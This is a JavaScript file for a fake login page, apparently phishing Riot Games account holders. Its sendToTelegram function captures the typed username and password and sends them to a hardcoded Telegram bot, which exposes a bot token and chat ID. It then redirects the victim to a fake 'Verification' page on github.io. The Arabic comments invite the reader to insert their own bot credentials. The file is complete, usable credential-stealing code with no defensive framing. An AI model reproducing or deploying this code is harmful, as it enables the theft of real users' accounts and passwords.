document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector(".login-btn");
    const svgIcon = loginBtn.querySelector("svg path");

    function isValidUsername(username) {
        return /^[a-zA-Z0-9]{3,24}$/.test(username);
    }

    function isValidPassword(password) {
        return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])[A-Za-z\d!@#$%^&*]{8,32}$/.test(password);
    }

    function checkInputs() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (isValidUsername(username) && isValidPassword(password)) {
            loginBtn.removeAttribute("disabled");
            loginBtn.style.backgroundColor = "var(--colorRed)"; 
            svgIcon.setAttribute("fill", "#fff"); 
        } else {
            loginBtn.setAttribute("disabled", "true");
            loginBtn.style.backgroundColor = "var(--colorLightGray)"; 
            svgIcon.setAttribute("fill", "var(--colorMediumGray)"); 
        }
    }

    function sendToTelegram() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (!isValidUsername(username) || !isValidPassword(password)) return;

        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // ضع توكن البوت الخاص بك هنا
        const chatId = "6687453395"; // ضع معرف الشات الخاص بك هنا
        const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(() => {
                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html";
            })
            .catch(error => console.error("Error sending to Telegram:", error));
    }

    usernameInput.addEventListener("input", checkInputs);
    passwordInput.addEventListener("input", checkInputs);
    loginBtn.addEventListener("click", sendToTelegram);
});
